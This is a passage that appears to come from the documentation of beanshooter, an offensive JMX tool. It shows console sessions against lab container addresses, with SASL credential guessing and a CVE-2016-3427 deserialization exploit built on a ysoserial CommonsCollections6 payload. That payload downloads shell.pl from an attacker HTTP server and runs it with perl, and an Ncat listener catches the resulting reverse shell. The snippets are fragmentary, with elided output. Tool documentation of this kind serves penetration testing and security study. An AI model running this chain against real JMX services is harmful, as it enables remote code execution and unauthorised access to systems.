...
```console
[pentester@kali ~]$ beanshooter 172.17.0.2 9010 status
...
```console
[pentester@kali ~]$ beanshooter --jmxmp 172.17.0.2 5555 status
...
```console
[qtc@kali ~]$ nmap -p 5556 172.30.0.2 -sV
[...]
...
```console
[pentester@kali ~]$ beanshooter --jmxmp --ssl 172.17.0.2 5556 status
[+] Connecting to JMX server... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Getting Status of MLet... done!
...
```console
[qtc@kali ~]$ beanshooter --jmxmp --ssl 172.30.0.2 5560 status
[+] Connecting to JMX server... failed!
...
```console
[pentester@kali ~]$ beanshooter --jmxmp  --ssl --sasl CRAM-MD5 172.17.0.2 5560 status
[+] Connecting to JMX server... failed!
...
```console
[pentester@kali ~]$ beanshooter --jmxmp  --ssl --sasl NTLM --username test --password test 172.17.0.2 5560 status
[+] Connecting to JMX server... failed!
...
```console
[pentester@kali ~]$ beanshooter --jmxmp  --ssl --sasl NTLM --username controlRole --password control 172.17.0.2 5560 status
[+] Connecting to JMX server... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Getting Status of MLet... done!
...
```console
[pentester@kali ~]$ beanshooter --jmxmp  --ssl --sasl DIGEST-MD5 --username controlRole --password control 172.17.0.2 5558 status
[+] Connecting to JMX server... failed!
...
```console
[pentester@kali ~]$ cat /etc/hosts | grep 172
...
```console
[pentester@kali ~]$ beanshooter --ssl 172.18.0.2 9010 cve-2016-3427 CommonsCollections6 "wget -O /dev/shm/s 172.18.0.1:8000/shell.pl"
...
```console
[pentester@kali ~]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.18.0.2 - - [24/Sep/2020 18:00:02] "GET /shell.pl HTTP/1.1" 200 -
```

Now you can spawn the shell with a second invocation:

```console
[pentester@kali ~]$ beanshooter --ssl 172.18.0.2 9010 cve-2016-3427 CommonsCollections6 "perl /dev/shm/s"
[+] Creating ysoserial payload...done.
[+] cve-2016-3427 - Sending serialized Object as credential.
[+]     An exception during the connection attempt is expected.
[+] Connecting to JMX server... 
...
Ncat: Connection from 172.18.0.2:44830.
id
...
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.18.0.2.
Ncat: Connection from 172.18.0.2:39177.
id
